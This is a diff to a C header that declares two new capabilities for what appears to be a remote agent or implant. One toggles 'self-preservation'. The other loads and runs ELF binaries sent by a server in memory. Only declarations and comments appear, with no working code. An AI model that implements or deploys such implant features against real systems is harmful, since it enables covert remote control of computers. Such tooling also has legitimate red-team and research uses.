@@ -76,4 +76,31 @@ int cap_sleep(agent_ctx_t *ctx,
               const tlv_field_t *fields, size_t field_count,
               tlv_buffer_t *result);
 
+/**
+ * Toggle self-preservation on or off.
+ * Expects TLV_TASK_DATA containing a single uint8:
+ *   0x01 = enable, 0x00 = disable.
+ * If no payload is provided, defaults to enable.
+ * Produces TLV_RESULT_STATUS and TLV_RESULT_DATA.
+ *
+ * NOTE: Like cap_sleep, this handler needs access to agent_ctx_t to
+ * modify the self_preserve flag.  The dispatcher calls it specially.
+ */
+int cap_selfpreserve(agent_ctx_t *ctx,
+                     const tlv_field_t *fields, size_t field_count,
+                     tlv_buffer_t *result);
+
+/**
+ * Load and execute an ELF binary received from the server.
+ * Expects TLV_TASK_DATA containing the raw ELF binary.
+ * Uses the userspace ELF loader to map, relocate, and execute it
+ * in the agent's address space.
+ * Produces TLV_RESULT_STATUS and TLV_RESULT_DATA.
+ *
+ * NOTE: Linux only.  On Windows this returns an error.
+ */
+int cap_load_elf(agent_ctx_t *ctx,
+                 const tlv_field_t *fields, size_t field_count,
+                 tlv_buffer_t *result);
+
 #endif /* CAPABILITIES_H */
